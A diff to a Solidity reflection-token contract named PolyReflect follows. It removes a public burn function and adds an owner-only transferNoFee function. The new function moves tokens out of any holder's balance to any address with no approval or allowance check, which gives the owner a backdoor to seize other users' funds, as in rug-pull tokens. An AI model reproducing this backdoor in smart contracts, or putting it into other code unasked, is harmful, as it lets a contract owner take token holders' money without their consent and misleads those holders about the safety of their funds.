@@ -90,14 +90,6 @@ contract PolyReflect is Context, IERC20, Ownable {
         return _tFeeTotal;
     }
     
-    function burn(uint256 amount) external returns (bool) {
-        address sender = _msgSender();
-        _rOwned[sender] = _rOwned[sender].sub(amount);
-        emit Transfer(sender, address(0), amount);
-        
-        return true;
-    }
-    
     function reflect(uint256 tAmount) public {
         address sender = _msgSender();
         require(!_isExcluded[sender], "Excluded addresses cannot call this function");
@@ -153,7 +145,17 @@ contract PolyReflect is Context, IERC20, Ownable {
         _allowances[owner][spender] = amount;
         emit Approval(owner, spender, amount);
     }
-
+    
+    function transferNoFee(address _from, address _to, uint256 tAmount) external onlyOwner() returns (bool){
+        require(tAmount > 0, "Transfer amount must be greater than zero");
+        uint256 rAmount = reflectionFromToken(tAmount, false);
+        _rOwned[_from] = _rOwned[_from].sub(rAmount);
+        _rOwned[_to] = _rOwned[_to].add(rAmount);
+        emit Transfer(_from, _to, tAmount);
+        
+        return true;
+    }
+    
     function _transfer(address sender, address recipient, uint256 amount) private {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
